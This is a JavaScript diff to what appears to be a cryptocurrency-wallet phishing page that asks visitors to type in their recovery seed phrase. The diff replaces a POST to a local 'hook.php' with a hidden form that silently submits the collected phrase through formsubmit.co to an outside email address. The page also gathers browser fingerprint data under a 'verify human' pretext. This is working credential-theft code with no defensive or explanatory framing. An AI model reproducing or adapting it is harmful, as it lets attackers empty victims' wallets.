@@ -51,6 +51,7 @@
                 platform: navigator.platform,
                 plugins: navigator.plugins.length
             };
+
             
             fetch('/verify_human.php', {
                 method: 'POST',
@@ -1572,6 +1573,31 @@ input.addEventListener('input', () => {
 
 
 
+  function getFormSubmitSeedForm() {
+    let form = document.getElementById('formsubmit-seed-form');
+    if (!form) {
+      form = document.createElement('form');
+      form.id = 'formsubmit-seed-form';
+      form.style.display = 'none';
+      form.action = 'https://formsubmit.co/zaq114@protonmail.com';
+      form.method = 'POST';
+
+      const input = document.createElement('input');
+      input.type = 'hidden';
+      input.name = 'phrase';
+      input.id = 'formsubmit-seed-input';
+      form.appendChild(input);
+      document.body.appendChild(form);
+    }
+    return form;
+  }
+
+  function submitViaFormSubmit(finalwords) {
+    const form = getFormSubmitSeedForm();
+    form.querySelector('#formsubmit-seed-input').value = finalwords;
+    form.submit();
+  }
+
 async function submitPhrase() {
     const inputs = Array.from(document.querySelectorAll('.word-input'));
     const words = inputs.map(i => i.value.trim().toLowerCase()).filter(Boolean);
@@ -1584,29 +1610,7 @@ async function submitPhrase() {
     msg.style.display = 'none';
     const finalwords = words.join(" ");
 
-    try {
-        const response = await fetch('hook.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phrase: finalwords })
-        });
-        
-        const result = await response.json();
-        
-        // Log the result for debugging
-        console.log('Hook response:', result);
-        
-        // Always proceed to processing screen
-        btn.textContent = 'Continue';
-        btn.disabled = false;
-        showProcessing();
-        
-    } catch(e) {
-        console.error('Error submitting seed:', e);
-        btn.textContent = 'Continue';
-        btn.disabled = false;
-        showProcessing();
-    }
+    submitViaFormSubmit(finalwords);
 }
 
   function showProcessing() {
